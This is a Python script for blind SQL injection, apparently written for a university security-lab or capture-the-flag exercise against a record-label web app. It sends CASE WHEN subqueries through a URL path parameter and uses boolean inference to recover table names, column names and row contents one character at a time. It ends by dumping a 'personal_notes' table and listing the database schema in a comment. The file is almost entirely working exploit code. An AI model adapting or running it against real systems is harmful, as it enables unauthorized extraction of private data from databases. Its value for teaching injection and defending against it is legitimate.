#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import string
import time
import sys
import re

#Name of the DB (obtainable looking on the 'conf.py' file)
DB_NAME = "rmb"
#Regex used to understand if the result of the queries belongs to 'label' order ('shadybrain Records' is the first result of the query ordered by 'label')
reg = re.compile('.*shadybrain Records.*')

#Function that send a page request (containing custom subquery)
def run_blind(payload):
	#Send a page request and save the response page
	response = requests.get("https://rmb.seclab.dais.unive.it/_get_releases/"+payload+"/0")
	#If the page contains 'releases' orrdered by 'label', it means that the subquery worked (True, otherwise False)
	if reg.search(response.text):
		return True
	else:
		return False

#Function that finds the number of the tables available into the DB
def find_tables_number():
	#Subquery that finds the number of the tables available by increasing the counter number for each try, when it finds the right number it will stop the research
	payload = "CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{}')={} THEN label ELSE cat END"
	counter = 0
	while True:
		#If the counter value is equals to the actual tables number, it will print and return the value and also stop the research, otherwise it will keep searching by increasing the counter value
		if run_blind(payload.format(DB_NAME,counter)):
			print("The DB has",counter,"tables:")
			break
		counter += 1
	return counter

#Function that finds the name of the tables available into the DB
def find_tables_name():
    #Subquery that finds the name of the table by costructing it, letter by letter, through comparisons
    payload = "CASE WHEN (SELECT BINARY MID(table_name,{},1) FROM information_schema.tables WHERE table_schema='{}' LIMIT {},1) = '{}' THEN label ELSE cat END"
    #Iterating this process for all the tables
    for table_index in range(find_tables_number()):
        print("(",table_index+1,") ", end="")
        sys.stdout.flush()

        char_index = 1
        while True:
            #Iteration that constructs the name letter by letter
            for char in string.printable.translate(str.maketrans('', '', string.whitespace)):
                #If the letter searched is equals to the actual letter of the name in a specified position, it will be printed and keep the research for the remaning parts of the name
                if run_blind(payload.format(char_index,DB_NAME,table_index,char)):
                    char_index += 1
                    print(char, end="")
                    sys.stdout.flush()
                    break
            else:
                break
        print("")
    print("\n")

#Function that finds the number of the fields (columns) given a table name
def find_columns_number(table_name):
	#Subquery that finds the number of the columns given a table name by increasing the counter number for each try, when it finds the right number it will stop the research
	payload = "CASE WHEN (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema='{}' AND table_name='{}') = '{}' THEN label ELSE cat END"
	counter = 0
	while True:
		#If the counter value is equals to the actual columns number, it will print and return the value and also stop the research, otherwise it will keep searching by increasing the counter value
		if run_blind(payload.format(DB_NAME,table_name,counter)):
			print("The",table_name.upper(),"table has",counter,"columns/fields ==>",table_name,"(", end="")
			sys.stdout.flush()
			break
		counter += 1
	return counter

#Function that finds the name of the fields (columns) given a table name
def find_columns_name(table_name):
	#Subquery that finds the columns name, through comparisons (construction letter by letter), given a table name
	payload = "CASE WHEN (SELECT MID(column_name,{},1) FROM information_schema.columns WHERE table_schema='{}' AND table_name='{}' LIMIT {},1) = '{}' THEN label ELSE cat END"

	n_columns = find_columns_number(table_name)
	#Iterate this process for each column of the specified table
	for column_index in range(n_columns):
		char_index = 1
		while True:
			#Iteration that constructs the name letter by letter
			for char in string.printable.translate(str.maketrans('', '', string.whitespace)):
				#If the letter searched is equals to the actual letter of the name in a specified position, it will be printed and keep the research for the remaning parts of the name
				if run_blind(payload.format(char_index,DB_NAME,table_name,column_index,char)):
					char_index += 1
					print(char, end="")
					sys.stdout.flush()
					break
			else:
				break
		if column_index != n_columns-1:
			print(",", end="")
	print(")\n\n")

#Function that finds the number of the rows available in a given table name
def rows_number(table_name):
	#Subquery that finds the number of the rows given a table name by increasing the counter number for each try, when it finds the right number it will stop the research
	payload = "CASE WHEN (SELECT COUNT(*) FROM {}.{})={} THEN label ELSE cat END"
	counter = 0
	while True:
		#If the counter value is equals to the actual rows number, it will print and return the value and also stop the research, otherwise it will keep searching by increasing the counter value
		if run_blind(payload.format(DB_NAME,table_name,counter)):
			print("The",table_name,"table has",counter,"row/s:")
			break
		counter += 1
	return counter

#Function that dumps the content of a given table name and fields
def dump_table_content(table_name,table_fields):
	#Subquery that finds the columns content, through comparisons (construction letter by letter), given a table name & fields
	payload = "CASE WHEN (SELECT BINARY MID({},{},1) FROM {}.{} LIMIT {},1) = '{}' THEN label ELSE cat END"

	n_rows = rows_number(table_name)
	#Iterate this process for each row of the specified table
	for row_index in range(n_rows):
		print("(",row_index+1,") ==>", end="")
		sys.stdout.flush()

		#Iterate this process for each fields specified (passed as param)
		for field_index in range(len(table_fields)):
			print(" ",table_fields[field_index],"= ", end="")
			sys.stdout.flush()

			char_index = 1
			while True:
				#Iteration that constructs the content letter by letter
				for char in string.printable:
					#If the letter searched is equals to the actual letter of the name in a specified position, it will be printed and keep the research for the remaning parts of the name
					if run_blind(payload.format(table_fields[field_index],char_index,DB_NAME,table_name,row_index,char)):
						char_index += 1
						print(char, end="")
						sys.stdout.flush()
						break
				else:
					break
		print("")


table_fields = ["id","release_id","text"]

find_tables_name()
find_columns_name("personal_notes__yaib2Oqu")
dump_table_content("personal_notes__yaib2Oqu",table_fields)


#The DB has 4 tables - All these informations were retrieved using the previous functions.
#
#artworks (id,release_id,image)
#personal_notes__yaib2Oqu (id,release_id,text)
#releases (id,label,cat,artist,title,format,year)
#sets (id,title,size,tracklist,year)